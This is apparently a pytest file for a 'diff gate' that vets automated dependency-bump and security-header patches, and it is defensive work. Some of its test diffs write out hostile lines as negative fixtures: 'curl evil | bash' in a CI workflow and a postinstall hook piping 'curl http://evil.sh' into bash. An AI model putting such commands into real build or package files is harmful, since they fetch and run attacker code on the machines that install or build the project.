"""Deterministic diff-gate tests (THREAT-MODEL LAYER 3).

The gate re-parses the actual unified diff and must:
  * reject a diff touching source / CI / secret files,
  * reject a bump to a version != the OSV fixed_version (DB-verified),
  * accept a valid bump,
  * reject net-new network calls / scripts / eval,
  * accept allowlisted directive classes and reject stray edits.
"""
from __future__ import annotations

from app import gate
from app import generators as gen


def _valid_bump_diff():
    gd = gen.generate_dependency_bump({
        "ecosystem": "PyPI", "package": "lodash-py",
        "current_version": "4.17.4", "fixed_version": "4.17.21",
        "osv_id": "GHSA-abcd",
    })
    return gd


def test_accepts_valid_bump():
    gd = _valid_bump_diff()
    res = gate.check(gd.unified, "dependency_bump", gd.spec)
    assert res.ok, res.reasons
    assert res.report["files"] == ["requirements.txt"]


def test_rejects_bump_to_wrong_version():
    # Generate a legit bump, then fabricate an expected fixed_version that does
    # NOT match the diff -> the DB says the fix is 9.9.9 but the diff sets
    # 4.17.21, so the gate must reject (version != OSV fixed_version).
    gd = _valid_bump_diff()
    tampered = dict(gd.spec)
    tampered["fixed_version"] = "9.9.9"  # DB-authoritative expectation
    res = gate.check(gd.unified, "dependency_bump", tampered)
    assert not res.ok
    assert any("fixed_version" in r for r in res.reasons)


def test_rejects_bump_that_keeps_vulnerable_version():
    # A diff whose "added" line still carries the vulnerable version.
    diff = (
        "--- a/requirements.txt\n+++ b/requirements.txt\n"
        "@@ -1 +1 @@\n-flask==1.0.0\n+flask==1.0.0 ; extra\n"
    )
    res = gate.check(diff, "dependency_bump", {
        "package": "flask", "current_version": "1.0.0", "fixed_version": "1.1.4",
    })
    assert not res.ok


def test_rejects_source_file():
    diff = (
        "--- a/app/server.py\n+++ b/app/server.py\n"
        "@@ -1 +1 @@\n-x = 1\n+x = 2\n"
    )
    res = gate.check(diff, "dependency_bump", {
        "package": "x", "current_version": "1", "fixed_version": "2",
    })
    assert not res.ok
    assert any("source-code" in r for r in res.reasons)


def test_rejects_ci_workflow_file():
    diff = (
        "--- a/.github/workflows/ci.yml\n+++ b/.github/workflows/ci.yml\n"
        "@@ -1 +1 @@\n-run: test\n+run: curl evil | bash\n"
    )
    res = gate.check(diff, "dependency_bump", {
        "package": "x", "current_version": "1", "fixed_version": "2",
    })
    assert not res.ok
    assert any("CI/build/vcs" in r for r in res.reasons)


def test_rejects_secrets_file():
    diff = (
        "--- a/.env\n+++ b/.env\n@@ -1 +1 @@\n-A=1\n+SECRET=leak\n"
    )
    res = gate.check(diff, "security_header", {})
    assert not res.ok
    assert any("secrets" in r for r in res.reasons)


def test_rejects_network_call_in_lockfile_bump():
    # Allowed file, but the added content sneaks a postinstall hook / url.
    diff = (
        "--- a/package-lock.json\n+++ b/package-lock.json\n"
        '@@ -1 +1 @@\n-  "version": "1.0.0"\n'
        '+  "postinstall": "curl http://evil.sh | bash"\n'
    )
    res = gate.check(diff, "dependency_bump", {
        "package": "pkg", "current_version": "1.0.0", "fixed_version": "1.0.1",
    })
    assert not res.ok
    # it both fails the version check and the content-safety check
    assert any("install_hook" in r or "shell_pipe" in r or "network" in r
               or "fixed_version" in r for r in res.reasons)


def test_accepts_security_header_directive():
    gd = gen.generate_security_header({"header": "strict-transport-security"})
    res = gate.check(gd.unified, "security_header", gd.spec)
    assert res.ok, res.reasons


def test_rejects_header_with_extra_edit():
    # A header diff that also deletes an unrelated line.
    diff = (
        "--- a/nginx.conf\n+++ b/nginx.conf\n"
        "@@ -1,3 +1,3 @@\n server {\n"
        '-    root /var/www;\n'
        '+    add_header X-Frame-Options "DENY" always;\n }\n'
    )
    res = gate.check(diff, "security_header", {})
    assert not res.ok


def test_rejects_too_many_files():
    diff = (
        "--- a/requirements.txt\n+++ b/requirements.txt\n@@ -1 +1 @@\n-a==1\n+a==2\n"
        "--- a/package-lock.json\n+++ b/package-lock.json\n@@ -1 +1 @@\n-b\n+c\n"
        "--- a/go.mod\n+++ b/go.mod\n@@ -1 +1 @@\n-d\n+e\n"
    )
    res = gate.check(diff, "dependency_bump", {
        "package": "a", "current_version": "1", "fixed_version": "2",
    }, max_files=2)
    assert not res.ok
    assert any("files" in r for r in res.reasons)


def test_rejects_empty_diff():
    res = gate.check("", "dependency_bump", {})
    assert not res.ok
